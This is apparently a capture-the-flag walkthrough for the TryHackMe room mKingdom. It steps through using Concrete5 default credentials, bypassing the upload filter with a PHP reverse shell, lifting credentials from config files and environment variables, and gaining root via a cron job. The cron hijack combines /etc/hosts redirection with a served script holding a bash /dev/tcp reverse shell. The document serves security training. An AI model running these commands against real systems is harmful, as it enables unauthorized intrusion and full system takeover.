# TryHackMe mKingdom - Complete Walkthrough

![TryHackMe](https://img.shields.io/badge/TryHackMe-mKingdom-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Boot2Root-blue?style=for-the-badge)

## 📋 Table of Contents
- [Overview](#overview)
- [Initial Reconnaissance](#initial-reconnaissance)
- [Web Application Exploitation](#web-application-exploitation)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Key Learnings](#key-learnings)
- [Tools Used](#tools-used)

## 🎯 Overview
mKingdom is a medium-difficulty challenge requiring extensive enumeration and focusing on:
- **Concrete5 CMS** exploitation
- **File upload bypass** techniques
- **Database credential** extraction
- **Environment variable** enumeration
- **Cronjob manipulation** for privilege escalation

## 🔍 Initial Reconnaissance

### 🌐 Port Scanning
```bash
nmap -sC -sV -oN nmap_scan.txt <TARGET_IP>
```

### 📊 Scan Results
**🎯 Open Ports:**
- **80/tcp** - HTTP service (only port open)

**🔍 Key Observation:** Limited attack surface - focus on web application

## 🕸️ Web Application Exploitation

### 📁 Directory Enumeration
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gobuster_results.txt
```

**🎯 Key Discovery:** `/app directory found`

### 🔍 Application Analysis
1. **Navigate to:** `http://<TARGET_IP>/app`
2. **Observation:** Login interface discovered
3. **CMS Identification:** Concrete5 CMS detected

### 🔐 Credential Discovery
**🎯 Authentication Bypass:**
- **Username:** `admin`
- **Password:** `password`

**💡 Method:** Common default credential testing

### 🎛️ Admin Panel Access
**🔑 Successful login** provides access to Concrete5 file manager interface

## 📤 File Upload Exploitation

### 🚫 Initial Upload Restrictions
**❌ Problem:** PHP file uploads blocked by default

### 🔧 Bypass Technique
**✅ Solution:** Modify allowed file extensions in Concrete5

#### 📋 Steps:
1. **Access** file manager settings
2. **Navigate** to file extension configuration
3. **Add** `php` to allowed extensions list
4. **Save** configuration changes

### 🐚 Reverse Shell Upload
```bash
# Create PHP reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php shell.php

# Edit IP and port
nano shell.php
# Set $ip = 'YOUR_IP';
# Set $port = YOUR_PORT;
```

### 🎧 Listener Setup
```bash
# Start netcat listener
nc -lnvp <PORT>
```

### 🚀 Shell Execution
1. **Upload** `shell.php` through file manager
2. **Navigate** to uploaded file location
3. **Execute** by accessing the file URL
4. **Receive** reverse shell connection

## 🔍 System Enumeration

### 👤 Initial Access
**🎯 User Context:** `www-data`

### 📁 Configuration File Discovery
```bash
# Navigate to application config directory
cd /var/www/html/appcastle/application/config

# Examine database configuration
cat database.php
```

**🎯 Credentials Found:** Database credentials for user `toad`

## 🔄 Lateral Movement

### 👥 User Escalation - Toad
```bash
# Switch to toad user
su toad
# Enter discovered password
```

### 🔍 Environment Variable Enumeration
```bash
# Check environment variables
env | grep -i pass
printenv | grep -i token
```

**🎯 Key Discovery:** `pwd_token` environment variable
```bash
pwd_token=aWthVGV0VEFOdEVTCg==
```

### 🔓 Token Decoding
```bash
# Decode base64 token
echo "aWthVGV0VEFOdEVTCg==" | base64 -d
```

**✅ Result:** Mario's password revealed

### 👑 User Escalation - Mario
```bash
# Switch to mario user
su mario
# Enter decoded password
```

### 🏆 User Flag Access
```bash
# User flag has root privileges, copy to accessible location
cp /home/mario/user.txt /tmp/
cat /tmp/user.txt
```

## 🚀 Privilege Escalation

### 🔍 Enumeration with LinPEAS
```bash
# Download and run LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 🎯 Critical Finding
**🔑 Writable /etc/hosts file discovered**

### 🕵️ Process Monitoring
```bash
# Deploy pspy for real-time process monitoring
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32
chmod +x pspy32
./pspy32
```

### 📅 Cronjob Discovery
**🎯 Root cronjob identified:**
```bash
curl mkingdom.thm:85/app/castle/application/counter.sh | bash
```

## 💥 Cronjob Exploitation

### 📝 Malicious Script Creation
```bash
# Create reverse shell script
cat > counter.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
EOF
```

### 🌐 HTTP Server Setup
```bash
# Set up directory structure
mkdir -p /app/castle/application/
mv counter.sh /app/castle/application/

# Start HTTP server on port 85
python3 -m http.server 85
```

### 🔧 DNS Manipulation
```bash
# Edit /etc/hosts to redirect mkingdom.thm
echo "YOUR_IP mkingdom.thm" >> /etc/hosts
```

### 🎧 Root Shell Listener
```bash
# Start listener for root shell
nc -lnvp <NEW_PORT>
```

## 🏆 Flags
- **👤 User Flag:** Located in `/home/mario/user.txt` (requires copy due to permissions)
- **👑 Root Flag:** Accessible after privilege escalation

## 📚 Key Learnings

### 🔍 Extensive Enumeration Importance
- **Single open port** doesn't mean limited attack surface
- **Directory enumeration** reveals hidden functionality
- **Configuration files** contain valuable credentials
- **Environment variables** may store sensitive data

### 🎛️ CMS Security
- **Default credentials** remain a common vulnerability
- **File upload restrictions** can often be bypassed
- **Administrative interfaces** provide powerful capabilities
- **Version identification** helps target specific exploits

### 🔄 Privilege Escalation Techniques
- **Writable system files** (/etc/hosts) enable advanced attacks
- **Cronjob monitoring** reveals automated processes
- **DNS redirection** can hijack legitimate requests
- **Process monitoring** tools are essential for timing attacks

### 🎯 Attack Chain Complexity
- **Multi-stage attacks** require patience and persistence
- **Credential reuse** across users and services
- **System monitoring** reveals exploitation opportunities
- **Creative solutions** overcome apparent limitations

## 🛠️ Tools Used
- `nmap` - Port scanning and service enumeration
- `gobuster` - Directory and file discovery
- `netcat` - Reverse shell listener
- `linPEAS` - Automated privilege escalation enumeration
- `pspy32` - Real-time process monitoring
- `python3 http.server` - Local HTTP server hosting
- `base64` - Token decoding
- **Concrete5 CMS** - Target application platform

## 🎯 Attack Flow Diagram
```
1. Port Scan → Single HTTP port (80)
2. Directory Enum → /app directory discovery
3. CMS Identification → Concrete5 detected
4. Default Creds → admin:password
5. File Upload Bypass → Add PHP extension
6. Reverse Shell → www-data access
7. Config File → Database credentials (toad)
8. User Lateral → Switch to toad
9. Env Variables → pwd_token discovery
10. Token Decode → Mario's password
11. User Escalation → Switch to mario
12. LinPEAS → /etc/hosts writable
13. Process Monitor → Cronjob discovery
14. DNS Hijack → Redirect mkingdom.thm
15. Malicious Script → Replace counter.sh
16. Root Shell → Privilege escalation complete
```

## 🔧 Critical Configuration Points

### 📁 File Extension Bypass
```php
// Concrete5 file extension configuration
// Navigate to: System & Settings → Files → Allowed File Types
// Add: php, phtml, php3, php4, php5
```

### 🌐 HTTP Server Directory Structure
```bash
# Required directory structure for cronjob hijack
mkdir -p /tmp/server/app/castle/application/
cd /tmp/server
python3 -m http.server 85
```

### 🔧 /etc/hosts Manipulation
```bash
# Add redirect entry
echo "YOUR_ATTACKER_IP mkingdom.thm" >> /etc/hosts

# Verify modification
cat /etc/hosts
```

## ⚠️ Common Pitfalls

### 🚫 File Upload Issues
- **Extension filtering** - Try multiple PHP extensions
- **File permissions** - Ensure uploaded files are executable
- **Path discovery** - Find where uploaded files are stored

### 🔍 Enumeration Oversights
- **Environment variables** often contain credentials
- **Configuration files** in application directories
- **Process monitoring** reveals hidden automated tasks

### 🎯 Privilege Escalation Challenges
- **Timing attacks** require patience and multiple attempts
- **Network connectivity** between attacker and target
- **Service dependencies** may affect cronjob execution

## 🎯 Alternative Attack Vectors

### 🔄 If File Upload Fails
1. **SQL injection** testing in login forms
2. **Local file inclusion** through application parameters
3. **Remote code execution** via CMS vulnerabilities
4. **Configuration file disclosure** through path traversal

### 🚀 Alternative Privilege Escalation
1. **SUID binaries** enumeration
2. **Kernel exploits** based on system version
3. **Service vulnerabilities** for local privilege escalation
4. **Scheduled tasks** beyond cronjobs

## 📋 Enumeration Checklist

### 🔍 Initial Assessment
- [ ] Port scanning (TCP/UDP)
- [ ] Service version identification
- [ ] Directory/file enumeration
- [ ] Technology stack identification

### 🌐 Web Application Testing
- [ ] Default credential testing
- [ ] File upload functionality
- [ ] Parameter fuzzing
- [ ] Source code analysis

### 👤 Post-Exploitation Enumeration
- [ ] Configuration file analysis
- [ ] Environment variable inspection
- [ ] Database credential hunting
- [ ] Process monitoring setup

### 🚀 Privilege Escalation Research
- [ ] SUID/GUID binary analysis
- [ ] Writable file identification
- [ ] Scheduled task discovery
- [ ] Network service enumeration

## 🎓 Skills Developed

### 🔧 Technical Skills
- **CMS exploitation** techniques
- **File upload bypass** methods
- **Process monitoring** and analysis
- **DNS hijacking** for privilege escalation
- **Environment variable** enumeration

### 🧠 Methodology Skills
- **Systematic enumeration** approach
- **Creative problem-solving** for limited attack surfaces
- **Multi-stage attack** planning and execution
- **Persistence** through extensive enumeration

---

> **💡 Pro Tip:** The mKingdom challenge emphasizes that even with limited open ports, thorough enumeration can reveal multiple attack paths. The combination of file upload bypass, credential reuse, and cronjob manipulation demonstrates the importance of comprehensive system analysis.

**Author:** Your Security Notes  
**Date:** Created for TryHackMe mKingdom Room  
**Difficulty:** Medium  
**Tags:** `#tryhackme` `#concrete5` `#fileupload` `#cronjob` `#privesc` `#enumeration`
